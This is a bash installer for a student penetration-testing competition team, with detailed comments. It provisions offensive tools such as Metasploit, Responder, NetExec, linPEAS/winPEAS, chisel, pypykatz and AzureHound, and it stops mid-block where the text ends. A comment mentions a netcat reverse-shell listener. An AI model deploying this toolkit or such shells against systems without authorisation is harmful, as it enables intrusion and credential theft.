#!/bin/bash

set -u

# Resolve our own location so we can source lib.sh and name sibling scripts,
# regardless of the cwd this was launched from. This has to happen BEFORE the log
# file is opened, because lib.sh is what resolves $USER_HOME and that is where the
# log goes - under sudo it is not $HOME.
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Colours, print_*, fin_msg, apt_install, pip_ensure, the pin manifest,
# fetch_pinned/clone_pinned/go_install, install_burp_latest, the $USER_HOME
# resolver and the verification helpers all live in lib.sh.
if [ ! -f "$SCRIPT_DIR/lib.sh" ]; then
    echo "[-] lib.sh not found next to all.sh - incomplete clone? Cannot continue."
    exit 1
fi
# shellcheck source=lib.sh
source "$SCRIPT_DIR/lib.sh"

LOG_FILE="$USER_HOME/all_install.log"
exec > >(tee -a "$LOG_FILE") 2>&1
own_user "$LOG_FILE" 2>/dev/null

# ---------------------------------------------------------------------------
# ROLES
# With no arguments this behaves exactly as it always did - the full suite.
# --mobile ADDS the two heaviest things in the build, which only the mobile/AI
# owner actually needs and which everyone else was previously paying for:
#   * the mobile kit incl. Android Studio   ~1.6 GB download
#   * the nuclei-templates clone            ~731 MB (full history)
# Measured sizes are in TOOLS.md. Deliberately the ONLY role: every other tool
# stays default-on, because splitting further costs more in "which flag do I
# need again?" on engagement morning than it saves in bandwidth.
# ---------------------------------------------------------------------------
WANT_MOBILE=0
WANT_AD=1          # the AD section is ON by default - see --no-ad below
WANT_REST=1        # everything that is not the AD section
for arg in "$@"; do
    case "$arg" in
        --mobile) WANT_MOBILE=1 ;;
        # --ismael is the old name for --mobile. Kept working rather than removed,
        # for the same reason ad.sh still exists: it is in muscle memory and on the
        # printed on-site checklist, and engagement morning is the worst time to
        # find out a flag you have typed all season is gone.
        --ismael) WANT_MOBILE=1 ;;
        --ad-only) WANT_REST=0 ;;
        --no-ad)   WANT_AD=0 ;;
        -h|--help)
            cat <<'USAGE'
Usage: all.sh [--mobile] [--ad-only | --no-ad]

  (no arguments)   The whole build: base, web, cloud, OT, reporting AND the
                   AD/internal tooling that used to live in a separate ad.sh.
                   This is what almost everyone should run.

  --mobile         ALSO install the mobile kit (jadx, apktool, adb, frida-tools,
                   Android Studio) and clone nuclei-templates.
                   Adds roughly 2.3 GB of downloads. Mobile/AI owner only.

  --ad-only        Run ONLY the AD/internal section. This is exactly what
                   running the old ad.sh did, for a box that already has the
                   rest of the suite.
  --no-ad          Skip the AD/internal section (~650 MB: BloodHound CE, neo4j
                   and the Windows payload set). For an operator who genuinely
                   will not touch the internal network.

  -h, --help       Show this and exit.

  (--ismael is still accepted as an alias for --mobile.)

ad.sh is now a thin wrapper that calls this script with --ad-only, so old habits
and the printed checklist still work.
USAGE
            exit 0 ;;
        *)
            echo "[-] Unknown argument: $arg  (try: bash all.sh --help)"
            exit 1 ;;
    esac
done

echo -e "${GREEN}"
echo "╔═══════════════════════════════════════════════════════╗"
echo "║     PSUT VAPT Team - Full Tool Installation           ║"
echo "║     Base + web + cloud + OT + reporting + AD          ║"
echo "╚═══════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ---------------------------------------------------------------------------
# PREFLIGHT
# start.sh ends by PRINTING a NEXT STEPS list, but nothing ever enforced it, so
# all.sh could happily run on a box where command logging was never activated -
# and every tool installed from that shell would be missing from the engagement
# log we hand the client. Check those manual steps here, show exactly what is
# missing and how to fix it, then make the operator decide.
# Default answer is NO. Set SKIP_PREFLIGHT=1 to bypass entirely.
# ---------------------------------------------------------------------------
PREFLIGHT_FAIL=0

pf_ok()   { print_success "  $1"; return 0; }
pf_bad()  { print_error   "  $1"; [ -n "${2:-}" ] && echo "         fix: $2"
            PREFLIGHT_FAIL=$((PREFLIGHT_FAIL+1)); return 0; }
pf_note() { print_warning "  $1"; [ -n "${2:-}" ] && echo "         fix: $2"; return 0; }

preflight() {
    print_status "Preflight - checking the manual steps start.sh asked for:"
    echo

    # [0] did start.sh run at all
    if [ -f "$USER_HOME/start_install.log" ]; then
        pf_ok "start.sh has been run on this box"
    else
        pf_bad "start.sh has NOT been run on this box (no $USER_HOME/start_install.log)" \
               "bash \"$SCRIPT_DIR/start.sh\""
    fi

    # [1] command logging: installed in the rc files, AND actually loaded.
    # A loaded hook is the only thing that proves it: the log file only grows
    # once a shell has sourced the block, so a non-empty log == activated.
    #
    # REPAIRS RATHER THAN REPORTS. If the block is absent this used to print
    # "fix: bash command_logging.sh" and move on - asking a human to type a
    # command that is sitting in this repo, is idempotent, and that this script
    # can simply run. A box that is not ready for all.sh after start.sh is a
    # script problem, so all.sh fixes what it is able to fix.
    if ! grep -q "cptc engagement logging" "$USER_HOME/.zshrc" "$USER_HOME/.bashrc" 2>/dev/null; then
        pf_note "command logging not configured - running command_logging.sh now"
        bash "$SCRIPT_DIR/command_logging.sh" || true
    fi
    if grep -q "cptc engagement logging" "$USER_HOME/.zshrc" "$USER_HOME/.bashrc" 2>/dev/null; then
        pf_ok "command logging block installed in $USER_HOME/.zshrc / $USER_HOME/.bashrc"
        if [ -s "$USER_HOME/.zsh_history_readable" ]; then
            pf_ok "command logging is LIVE ($(wc -l < "$USER_HOME/.zsh_history_readable") lines so far)"
        else
            # THE ONE ITEM NO SCRIPT CAN FIX. The hook loads when a shell sources
            # the rc file; all.sh cannot source anything into the parent shell
            # that invoked it. This genuinely needs the operator to open a shell.
            pf_bad "command logging installed but NOTHING logged yet - hook not loaded" \
                   "open a FRESH terminal (all.sh cannot load a hook into the shell that started it)"
        fi
    else
        pf_bad "command logging STILL not configured after re-running command_logging.sh" \
               "read the command_logging.sh output above - this is a real failure"
    fi

    # [2] uniform terminal - both emulators, so screenshots match across the team.
    # Same policy as [1]: re-run the repo's own script instead of printing it as
    # homework. terminal_uniform.sh does chattr -i before writing, so re-running
    # it over an already-locked qterminal.ini is safe and idempotent.
    local uni=0
    _count_uni() {
        uni=0
        grep -q "^colorScheme=CPTC" "$USER_HOME/.config/qterminal.org/qterminal.ini" 2>/dev/null && uni=$((uni+1))
        grep -q "^ColorPalette=" "$USER_HOME/.config/xfce4/terminal/terminalrc" 2>/dev/null && uni=$((uni+1))
        return 0
    }
    _count_uni
    if [ "$uni" -ne 2 ]; then
        pf_note "uniform terminal incomplete ($uni/2 emulators) - running terminal_uniform.sh now"
        bash "$SCRIPT_DIR/terminal_uniform.sh" || true
        _count_uni
    fi
    if [ "$uni" -eq 2 ]; then
        pf_ok "uniform terminal applied (qterminal + xfce4-terminal)"
    elif [ "$uni" -eq 1 ]; then
        pf_note "uniform terminal applied to only ONE emulator - screenshots may not match" \
                "the other emulator may simply not be installed on this box"
    else
        pf_bad "uniform terminal NOT applied even after re-running terminal_uniform.sh" \
               "read the terminal_uniform.sh output above - this is a real failure"
    fi

    # [3] Burp: deliberately NOT checked here any more.
    # all.sh now installs Burp itself and then wires in the logging extension, in
    # that order, further down this script. A preflight cannot demand something
    # the same run is about to provide - that check used to fail on every fresh
    # box and taught people to ignore the preflight output.
}

if [ "${SKIP_PREFLIGHT:-0}" = "1" ]; then
    print_warning "SKIP_PREFLIGHT=1 - preflight checks bypassed"
else
    preflight
    echo
    if [ "$PREFLIGHT_FAIL" -eq 0 ]; then
        print_success "Preflight clean - every manual step from start.sh is done."
    else
        print_warning "$PREFLIGHT_FAIL preflight check(s) FAILED (see above)."
        print_warning "These are the ones all.sh could NOT repair by itself - it already"
        print_warning "re-ran command_logging.sh / terminal_uniform.sh for anything it could."
        print_warning "Anything you run before command logging is live is absent from the"
        print_warning "engagement log, and that log is what answers 'prove what you did at time T'."
    fi
    echo
    # NON-INTERACTIVE BY DESIGN. This used to stop and ask "Proceed? [N/y]", which
    # meant a build could not be started and left alone - and on a box with no TTY
    # it refused to run at all. The preflight's value is the DIAGNOSIS, not the
    # gate: it tells you precisely which manual step is missing and how to fix it.
    # So it now reports and continues. Set STRICT_PREFLIGHT=1 to make a failure
    # abort instead, for anyone who wants the old behaviour in a rehearsal.
    if [ "$PREFLIGHT_FAIL" -ne 0 ]; then
        if [ "${STRICT_PREFLIGHT:-0}" = "1" ]; then
            print_error "STRICT_PREFLIGHT=1 and $PREFLIGHT_FAIL check(s) failed - aborting."
            print_error "Fix the items above, then: bash \"$SCRIPT_DIR/all.sh\""
            exit 1
        fi
        print_warning "Continuing anyway (nothing here blocks installing tools)."
        print_warning "FIX THE ITEMS ABOVE AFTERWARDS - they are listed again at the end."
    fi
fi

# NOTE: shell-history growth + command logging moved to command_logging.sh, which
# start.sh runs. Do not re-add inline HISTSIZE/preexec lines here - command_logging.sh
# refuses to run when it detects those stale, un-guarded hooks in ~/.zshrc.

# Only meaningful with an X session under xfce. Previously this ran unguarded as the
# very first action, so on a headless / SSH-only box the script opened with a red
# failure line before doing anything real.
if [ -n "${DISPLAY:-}" ] && command -v xfconf-query >/dev/null 2>&1; then
    if xfconf-query -c xfwm4 -p /general/use_compositing -s false; then
        print_success "Shell display settings configured"
    else
        print_warning "Shell display configuration failed"
    fi
else
    print_status "No X session (or xfconf-query absent) - skipping compositing tweak"
fi


if [ -d "$USER_HOME/dropzone" ]; then
    # Re-running is the NORMAL case, not an error: apt_install, pip_ensure,
    # fetch_pinned, clone_pinned and go_install are all idempotent and skip work
    # that is already done - REHEARSAL.md step 11 exists to test exactly that. So
    # this is a note, not a question. It used to prompt "Continue anyway? (y/N)",
    # which made an unattended re-run impossible.
    print_status "Dropzone already exists - this looks like a re-run. Installers are"
    print_status "  idempotent, so completed work is skipped. Continuing."
fi

print_status "Checking sudo privileges..."
if ! sudo -v; then
    print_error "sudo access denied. run script with a sudoer please."
    exit 1
fi
print_success "Sudo privileges confirmed"

while true; do sudo -n true; sleep 60; kill -0 "$$" || exit; done 2>/dev/null &

print_status "Creating dropzone directory..."
mkdir -p "$USER_HOME/dropzone"
cd "$USER_HOME/dropzone" || { print_error "cannot cd to $USER_HOME/dropzone"; exit 1; }
# Hand it back if we are root (sudo run) - otherwise the operator ends up with a
# dropzone they cannot write to without sudo for the rest of the engagement.
own_user "$USER_HOME/dropzone"
print_success "Dropzone created at $USER_HOME/dropzone"

export DEBIAN_FRONTEND=noninteractive

print_status "Removing needrestart to avoid prompts..."
sudo apt-get remove needrestart -y -o DPkg::Lock::Timeout=600 -o Acquire::Retries=3 2>/dev/null || print_warning "needrestart not installed"

print_status "Updating package lists..."
if sudo apt-get update -o DPkg::Lock::Timeout=600 -o Acquire::Retries=3; then
    print_success "Package lists updated"
else
    print_error "Failed to update packages"
    exit 1
fi

if [ "$WANT_REST" -eq 0 ]; then
    print_status "--ad-only: skipping base/web/cloud/OT/reporting, jumping to the AD section."
fi

if [ "$WANT_REST" -eq 1 ]; then
print_status "Installing APT packages one-by-one (this will take several minutes)..."
apt_install \
    apt-transport-https libssl-dev mc seclists curl golang gobuster nbtscan \
    onesixtyone oscanner smbclient smbmap smtp-user-enum snmp sslscan sipvicious \
    tnscmd10g whatweb hashcat feroxbuster dnsrecon redis-tools git \
    wget aircrack-ng set hydra docker.io docker-compose openjdk-11-jdk default-jdk john awscli \
    sshuttle ffuf python3-venv nuclei dirsearch flameshot scrot \
    maim cyberchef enum4linux nikto wfuzz steghide binwalk exiftool \
    netcat-traditional socat proxychains4 masscan metasploit-framework responder \
    netexec wireshark tcpdump tmux screen remmina terminator \
    arjun phpggc rlwrap unzip
# REMOVED: burpsuite (the apt package). Burp is now installed from PortSwigger's
#   official "latest community" download instead - see install_burp_latest in lib.sh.
#   Two reasons: the archive package is whatever version Kali froze, and the rules
#   permit Community only (Pro is banned), so being explicit about the edition we
#   fetched is worth more than an apt one-liner. Boxes built before this change
#   still have the apt one: sudo apt purge burpsuite
# ADDED: default-jdk. NOT optional, and openjdk-11-jdk does NOT cover it. Burp's
#   own entry point burp/StartBurp is class-file major 65, i.e. Java 21; measured
#   on 2026.3.3, and an older JVM dies with:
#     UnsupportedClassVersionError: burp/StartBurp has been compiled by a more
#     recent version of the Java Runtime (class file version 65.0) ...
#   openjdk-11-jdk STAYS because ysoserial's gadget chains want an old runtime.
#   The /usr/local/bin/burpsuite wrapper picks a JVM >= 21 rather than trusting
#   whatever 'java' resolves to.
# REMOVED: zaproxy. 211 MB download / 267 MB on disk for a second intercepting
#   proxy we do not use - burpsuite is the one the team actually runs, and Burp is
#   the one wired into the engagement-evidence layer (burp_logging.sh). Boxes built
#   before this change still have it: sudo apt purge zaproxy.
# ADDED: arjun (hidden HTTP parameter discovery), phpggc (PHP deserialisation gadget
#   chains - pulls php-cli), rlwrap (readline wrapper; 'rlwrap nc -lvnp 443' makes a
#   raw reverse shell survivable), unzip (needed to unpack the AzureHound release).
#   All four together are about 1 MB.
# Notes on three entries above:
#  * docker-compose      - Kali packages Compose v2 (2.40.3-3). This replaces an 8-line
#                          curl of a ~49 MB binary from GitHub into /usr/local/bin, i.e.
#                          one less network dependency in the first hour.
#  * python3-venv        - was pinned to python3.13-venv. That package exists today and
#                          Kali's default python3 IS 3.13, so the pin was not broken - but
#                          the metapackage tracks the default and survives a version bump.
#  * netexec             - crackmapexec was DROPPED: cme is the deprecated tool and nxc
#                          supersedes it entirely. netexec (1.5.1) was only ever installed
#                          only by the AD section, so web/cloud operators had no nxc;
#                          installing it here is what makes dropping cme safe.

# --- Reporting pipeline dependencies ---------------------------------------
# The report builder (zozo) imports docx, fitz, PIL and pytesseract, and now reads an
# .xlsx findings sheet. NONE of these were installed by any script, so on a fresh VDI
# the most point-bearing tool the team owns could not run at all. All are native Kali
# packages - no pip, no --break-system-packages.
# Trim libreoffice-writer if disk is tight; it is only needed for docx->pdf conversion.
#
# python3-fitz IS REQUIRED and python3-pymupdf alone is NOT enough. Verified on Kali:
# python3-pymupdf provides 'import pymupdf' only, and zozo's tools do 'import fitz'.
# The legacy fitz alias ships in the separate python3-fitz package.
#   with python3-pymupdf only : ModuleNotFoundError: No module named 'fitz'
#   after python3-fitz        : import fitz OK (PyMuPDF 1.26.7)
print_status "Installing reporting pipeline dependencies..."
apt_install \
    tesseract-ocr python3-docx python3-openpyxl python3-pil \
    python3-pytesseract python3-pymupdf python3-fitz libreoffice-writer

print_status "Adding user to docker group..."
# "$CPTC_USER", not "$USER" and not "$(id -un)".
#   "$USER"      - with 'set -u' an unset USER (sudo -i, cron, some non-login
#                  shells) aborts the whole script with "USER: unbound variable".
#   "$(id -un)"  - under `sudo bash all.sh` this is ROOT. The docker group then
#                  went to root, who already has access by fiat, and the OPERATOR
#                  never got it. They later hit "permission denied on
#                  /var/run/docker.sock" bringing up jVision with no idea why,
#                  because the build had printed "User added to docker group".
# $CPTC_USER is resolved from this script's own path, so it names the operator
# whether or not sudo is in play.
if sudo usermod -aG docker "$CPTC_USER"; then
    print_success "User added to docker group (logout/login required)"
else
    print_warning "Failed to add user to docker group"
fi

fin_msg 'APT packages'

# ---------------------------------------------------------------------------
# BASE PYTHON RUNTIME  - RE-ENSURED HERE, NOT JUST CHECKED
# ---------------------------------------------------------------------------
# These three are start.sh's job. They are repeated here because all.sh used to
# only *verify* them (check_pymod requests / check_pymod pwn, far below) and had
# no way to fix what it found missing.
#
# That gap was not theoretical. On the first clean-VM run, start.sh's single
# `pip install argparse requests pwntools bs4` died because pwntools pulls
# `unicorn`, which builds C extensions and found no cmake on a stock Kali image.
# pip treats one command as one transaction, so `failed-wheel-build-for-install`
# took the other three with it. all.sh then dutifully reported pwntools missing
# at the end of a 40-minute build and did nothing about it - which leaves the box
# NOT READY, with the only remedy being a human typing pip commands.
#
# The build is not allowed to need that. start.sh now installs cmake and splits
# the pip calls so the root cause is gone; this block is the second line of
# defence, so a box whose start.sh phase failed for ANY reason still converges
# when all.sh runs. pip_ensure imports first and skips when present, so on a
# healthy box these are three no-op import checks.
# pwntools pulls `unicorn`, which COMPILES C extensions: without cmake it dies on
# "No such file or directory: 'cmake'", which is exactly how the clean-VM run lost
# it. cmake and build-essential are in start.sh's apt list now, but this block
# also has to work (a) on a box built by the OLD start.sh and (b) under --ad-only,
# where the main apt list above is skipped entirely. apt_install does a dpkg query
# first, so on a healthy box this is three no-ops.
# ninja-build is here for icspacket further down - scikit-build-core wants cmake
# AND ninja, and the OT section cannot install it any earlier than this.
print_status "Ensuring the build toolchain (needed by compiled Python deps)..."
apt_install build-essential cmake ninja-build pkg-config

print_status "Ensuring base Python runtime (start.sh's set)..."
# python3-pwntools FROM APT, not pip. pip has to build `unicorn` from source
# because there is no cp314 wheel, and unicorn 2.1.2's bundled QEMU code does not
# compile against glibc 2.43 / GCC 15.2:
#     src/qemu/util/osdep.c:66: error: implicit declaration of function 'mprotect'
#     src/qemu/util/osdep.c:79: error: 'PROT_READ' undeclared
# Kali ships python3-pwntools 4.15.0-1 - the same version pip wanted - built
# against the distro's python3-unicorn. See the long note in start.sh.
apt_install python3-pwntools

pip_ensure requests requests
pip_ensure bs4 beautifulsoup4
# Only reached if apt did not provide it; pip_ensure imports first, so on a
# healthy box this is one import check and nothing is built.
pip_ensure pwn pwntools
fin_msg 'base Python runtime'

# ---------------------------------------------------------------------------
# BURP SUITE + ITS LOGGING EXTENSION  - in that order, and both live HERE
# ---------------------------------------------------------------------------
# These two moved out of start.sh on purpose. start.sh used to install the Burp
# LOGGING EXTENSION while Burp itself came from all.sh's apt list much later, so
# on a fresh box burp_logging.sh ran against a machine with no Burp on it: it
# could stage the jython jar and the extension, but it had no UserConfig*.json to
# patch (Burp writes that on first run), so the auto-load registration silently
# did not happen. The operator then started Burp for the first time, got no
# extension, and nothing in the logs explained why.
#
# ORDER MATTERS AND IS NOW ENFORCED BY SEQUENCE: install Burp, let the config
# exist, then wire the extension in.
print_status "Installing Burp Suite Community (latest, from PortSwigger)..."
if install_burp_latest; then
    BURP_OK=1
else
    BURP_OK=0
    print_warning "Burp install failed - the logging extension will be staged anyway"
    print_warning "  so it is in place once Burp is available."
fi

# PURGE KALI'S BURP ONLY ONCE OURS IS ON DISK.
# Kali's ISO ships its own `burpsuite` package (2026.3.2-0kali1) with its own menu
# entry, and two Burps is an EVIDENCE problem: the operator picks "Burp Suite
# Community" from the application menu, gets Kali's copy, and nothing is written
# to ~/.burp_history_readable.
#
# But this used to run in start.sh, early - and that made a flaky download fatal.
# On a teammate's run the 653 MB download died at 412 MB with
#     curl: (56) Recv failure: Connection reset by peer
# and because Kali's copy had already been purged minutes earlier in start.sh,
# the finished box had NO Burp at all. Removing the fallback before the
# replacement exists is only safe if the replacement cannot fail, and a 653 MB
# download over someone else's network can always fail.
# So: gated on BURP_OK, and if ours did not land, Kali's older copy stays.
if [ "$BURP_OK" -eq 1 ] && dpkg -s burpsuite &>/dev/null; then
    print_status "Removing Kali's packaged Burp (ours is installed, so it is now safe)..."
    sudo env DEBIAN_FRONTEND=noninteractive apt-get purge -y \
        -o DPkg::Lock::Timeout=600 burpsuite \
        && print_success "Kali's burpsuite package removed" \
        || print_warning "Could not purge Kali's burpsuite (non-critical)"
elif [ "$BURP_OK" -eq 0 ] && dpkg -s burpsuite &>/dev/null; then
    print_warning "KEEPING Kali's burpsuite package: ours failed to install, so it is"
    print_warning "  the only Burp on this box. It has NO logging extension - re-run"
    print_warning "  bash all.sh  once the network is healthy to get ours."
fi

print_status "Configuring Burp Suite HTTP logging..."
if bash "$SCRIPT_DIR/burp_logging.sh"; then
    print_success "Burp logging configured (readable log: $USER_HOME/.burp_history_readable)"
else
    print_warning "Burp logging setup reported an issue - see output above"
fi
own_user "$USER_HOME/.BurpSuite" 2>/dev/null
fin_msg 'Burp Suite + engagement logging'

# Download jsmith wordlists
#git clone https://github.com/insidetrust/statistically-likely-usernames
#fin_msg 'jsmith wordlists' 



# git clone https://github.com/NaturalT314/ToolBox
# fin_msg 'NaturalT314 ToolBox'

# # Install Neo4j
# wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
# echo 'deb https://debian.neo4j.com stable 4' | sudo tee /etc/apt/sources.list.d/neo4j.list > /dev/null
# sudo apt-get update
# sudo apt-get install neo4j -y
# sudo systemctl stop neo4j
# fin_msg 'neo4j'



print_status "Creating privesc tools directory..."
mkdir -p $USER_HOME/dropzone/privesc
cd $USER_HOME/dropzone

print_status "Downloading privilege escalation scripts..."
# URLs, versions and expected hashes now live in lib.sh's pin manifest, so the
# same artifact cannot be fetched from two different URLs by two scripts.
fetch_pinned linpeas          $USER_HOME/dropzone/privesc/linpeas.sh
# PowerUp.ps1 REMOVED. PowerSploit was archived by its authors in 2021, has no
# maintained fork, and was only ever pinned to an untagged `master` - so it was
# the least trustworthy artifact in the manifest. Everything it finds (unquoted
# service paths, weak service ACLs, AlwaysInstallElevated, modifiable binaries)
# is covered by winPEAS and PrivescCheck, both of which are current and pinned to
# real releases. powerview.ps1 from the same archived repo is kept on purpose:
# it has no equivalent replacement.
fetch_pinned winpeas          $USER_HOME/dropzone/privesc/winpeas.exe
fetch_pinned privesc_ps1      $USER_HOME/dropzone/privesc/privesc.ps1
fetch_pinned privesccheck     $USER_HOME/dropzone/privesc/PrivescCheck.ps1
# Explicit 0755 everywhere below, never `chmod +x`. POSIX `+x` with no who-list
# respects the UMASK, so at umask 0007 it turns 0644 into 0754 instead of 0755 -
# the tool is then not executable by other accounts, and the mode of the build
# silently depends on who launched it. See the note in lib.sh's fetch_pinned.
chmod 0755 $USER_HOME/dropzone/privesc/linpeas.sh 2>/dev/null
fin_msg 'Privesc Scripts'

print_status "Downloading pspy64..."
if fetch_pinned pspy64 $USER_HOME/dropzone/pspy64; then
    chmod 0755 $USER_HOME/dropzone/pspy64
    fin_msg 'pspy64'
fi

print_status "Downloading username-anarchy..."
if fetch_pinned username_anarchy $USER_HOME/dropzone/username-anarchy; then
    chmod 0755 $USER_HOME/dropzone/username-anarchy
fi

print_status "Downloading upshell (TTY upgrade helper)..."
if [ -f /usr/local/bin/upshell ]; then
    print_success "upshell already installed (skip)"
elif fetch_pinned upshell $USER_HOME/dropzone/upshell; then
    sudo cp $USER_HOME/dropzone/upshell /usr/local/bin/upshell && sudo chmod 0755 /usr/local/bin/upshell
    print_success "upshell installed to /usr/local/bin/upshell"
    fin_msg 'upshell'
fi

print_status "Downloading chisel..."
# chisel release assets are a gzipped BINARY (chisel_<ver>_linux_amd64.gz), NOT a
# tarball - the old .tar.gz URL 404'd, so chisel never installed. Gunzip, don't untar.
if command -v chisel &>/dev/null; then
    print_success "chisel already installed: $(chisel --version 2>&1)"
elif fetch_pinned chisel $USER_HOME/dropzone/chisel.gz && \
     gunzip -f $USER_HOME/dropzone/chisel.gz && chmod 0755 $USER_HOME/dropzone/chisel && \
     sudo mv $USER_HOME/dropzone/chisel /usr/local/bin/chisel; then
    print_success "chisel installed: $(chisel --version 2>&1)"
    fin_msg 'chisel'
else
    print_warning "chisel installation failed"
    rm -f $USER_HOME/dropzone/chisel.gz $USER_HOME/dropzone/chisel
fi


# ScoutSuite REMOVED 2026-10-05 on measured cost. principalmapper KEPT.
# This pip block was the single most expensive thing in the build - timed on run
# 5 it took 7m40s, 1,117 package downloads and 1.7 GB of site-packages, out of a
# 33-minute all.sh - and ScoutSuite was responsible for nearly all of it, because
# it is a MULTI-cloud auditor and pip installs every provider SDK whether or not
# we will ever point it at one. Confirmed by `Required-by`, every one of these
# came from ScoutSuite and nothing else:
#     oci                       430 MB   Oracle Cloud
#     google-api-python-client  109 MB
#     kubernetes                 82 MB
#     pydo                       73 MB   DigitalOcean
#     + nine aliyun-python-sdk-* packages   Alibaba Cloud
# That is roughly a quarter of all.sh's wall time spent on Oracle, Alibaba, GCP
# and DigitalOcean support for an engagement against a theme park.
#
# principalmapper is NOT removed, deliberately. It is a fraction of ScoutSuite's
# cost and it does a job nothing else in the build does: it graphs which IAM
# principal can reach which, i.e. AWS privesc PATHS. pacu enumerates, it does not
# graph. Dropping it would have been a capability gap disguised as a size saving.
#
# What is left still covers the cloud work we actually expect: awscli + pacu +
# pmapper for AWS, and azure-cli + roadtools + azurehound below for Entra/Azure -
# which is the likelier target anyway, since the CPTC 12 client was identified
# through its Azure tenant and the deliverables live in M365.
#
# If an assessment genuinely needs ScoutSuite on the day it is one command from
# the box (`pip install scoutsuite --break-system-packages`), and that is a better
# trade than every operator paying ~7 minutes and 1.7 GB for Oracle, Alibaba, GCP
# and DigitalOcean support we will not use.
print_status "Installing AWS/Cloud Python packages..."
pip_ensure pacu pacu
pip_ensure principalmapper principalmapper   # IAM privesc PATHS - pacu does not graph these
pip_ensure minikerberos minikerberos
pip_ensure pypykatz pypykatz
fin_msg 'Cloud Security Tools'

# --- Azure / Entra ID ------------------------------------------------------
# Everything above this point is AWS-ONLY (awscli, pacu, pmapper).
# That is a real hole: CPTC's own infrastructure is an Entra/M365 tenant, the
# deliverables live in M365, and the CPTC 12 client was identified THROUGH its
# Azure tenant. If the in-scope cloud turns out to be Azure we previously had
# nothing at all.
#
# azure-cli is in Kali's own repo (2.90.0-1), so no Microsoft apt repo, no GPG
# key dance, and no lsb_release workaround. It is ~175 MB with dependencies -
# the single heaviest default-on addition, and roughly what removing zaproxy
# gave back.
print_status "Installing Azure / Entra ID tooling..."
apt_install azure-cli
pip_ensure roadtools roadrecon          # ROADtools - Entra ID recon (roadrecon)

# AzureHound feeds the SAME BloodHound CE instance the AD section below installs,
# on-prem AD paths end up in one graph.
if command -v azurehound &>/dev/null; then
    print_success "azurehound already installed: $(azurehound --version 2>&1 | head -n1)"
elif fetch_pinned azurehound $USER_HOME/dropzone/azurehound.zip; then
    # Do not assume where inside the zip the binary sits - locate it. An upstream
    # layout change would otherwise fail as a confusing "unpack failed".
    if unzip -o -q $USER_HOME/dropzone/azurehound.zip -d $USER_HOME/dropzone/azurehound.d && \
       AH_BIN=$(find $USER_HOME/dropzone/azurehound.d -type f -name azurehound | head -n1) && \
       [ -n "$AH_BIN" ] && \
       sudo install -m 0755 "$AH_BIN" /usr/local/bin/azurehound; then
        print_success "azurehound installed: $(azurehound --version 2>&1 | head -n1)"
        rm -rf $USER_HOME/dropzone/azurehound.zip $USER_HOME/dropzone/azurehound.d
        fin_msg 'AzureHound'
    else
        print_warning "azurehound unpack failed - is 'unzip' installed?"
    fi
fi
fin_msg 'Azure / Entra ID Tools'

print_status "Setting up wordlists..."
if [ ! -d "/usr/share/wordlists/kali-wordlists" ]; then
    # needs root to write /usr/share, so this one stays a direct clone; the
    # commit is still recorded so boxes can be compared.
    if sudo git clone https://github.com/00xBAD/kali-wordlists.git /usr/share/wordlists/kali-wordlists; then
        print_success "Kali wordlists cloned"
        record_pin kali_wordlists HEAD \
            "$(git -C /usr/share/wordlists/kali-wordlists rev-parse HEAD 2>/dev/null || echo -)"
        UNPINNED+=("kali_wordlists")
    else
        print_warning "Kali wordlists clone failed"
    fi
else
    print_success "Kali wordlists already exist"
fi

if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
    print_status "Extracting rockyou.txt..."
    sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || print_success "rockyou.txt already extracted"
fi

if [ -f "/usr/share/wordlists/rockyou.txt" ]; then
    rockyou_lines=$(wc -l < /usr/share/wordlists/rockyou.txt)
    print_success "rockyou.txt available ($rockyou_lines lines)"
fi
fin_msg 'Wordlists'

print_status "Installing Sublime Text..."
if wget -q --tries=3 --timeout=15 -O - https://download.sublimetext.com/sublimehq-pub.gpg | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/sublimehq-archive.gpg > /dev/null && \
   echo "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list > /dev/null && \
   sudo apt-get update -qq -o DPkg::Lock::Timeout=600 -o Acquire::Retries=3 && \
   sudo env DEBIAN_FRONTEND=noninteractive apt-get install -qq -y -o DPkg::Lock::Timeout=600 -o Acquire::Retries=3 \
        -o Dpkg::Options::=--force-confdef -o Dpkg::Options::=--force-confold \
        sublime-text; then
    subl_version=$(subl --version 2>&1)
    print_success "Sublime Text installed: $subl_version"
    fin_msg 'Sublime Text'
else
    print_warning "Sublime Text installation failed (non-critical)"
fi

# nuclei-templates is a FULL-HISTORY clone of a 731 MB repository - by a wide
# margin the biggest git operation in this script. clone_pinned only passes
# --depth 1 when it is given a tag, and this call has none.
if [ "$WANT_MOBILE" -eq 1 ]; then
    print_status "Cloning nuclei templates (--mobile; ~731 MB)..."
    cd $USER_HOME/dropzone
    if clone_pinned nuclei-templates https://github.com/projectdiscovery/nuclei-templates.git \
            "$USER_HOME/dropzone/nuclei-templates"; then
        templates_count=$(find "$USER_HOME/dropzone/nuclei-templates" -name "*.yaml" | wc -l)
        print_success "Nuclei templates: $templates_count templates"
        fin_msg 'Nuclei Templates'
    fi
else
    print_status "Skipping the nuclei-templates clone (~731 MB) - run with --mobile to get it."
    print_warning "  nuclei itself IS installed. On first use it tries to download its own"
    print_warning "  template set to ~/.local/nuclei-templates, which needs internet egress."
    print_warning "  If the engagement network is isolated, that fetch will fail and nuclei"
    print_warning "  will have no templates. Either run --mobile on one box and copy the"
    print_warning "  directory across, or run 'nuclei -update-templates' while you still"
    print_warning "  have egress."
fi


print_status "Cloning jwt_tool (JWT tampering/cracking)..."
cd $USER_HOME/dropzone
clone_pinned jwt_tool https://github.com/ticarpi/jwt_tool.git "$USER_HOME/dropzone/jwt_tool"
if [ -d "$USER_HOME/dropzone/jwt_tool" ]; then
    chmod 0755 "$USER_HOME/dropzone/jwt_tool/jwt_tool.py" 2>/dev/null
    # requirements.txt is the source of truth for deps; if upstream ever moves it,
    # fall back to the ones the README names. requests is already in from start.sh.
    if [ -f "$USER_HOME/dropzone/jwt_tool/requirements.txt" ]; then
        if pip install -r "$USER_HOME/dropzone/jwt_tool/requirements.txt" --break-system-packages; then
            print_success "jwt_tool dependencies installed"
        else
            print_warning "jwt_tool dependencies failed - it may not run"
        fi
    else
        print_warning "jwt_tool/requirements.txt missing - installing the documented deps"
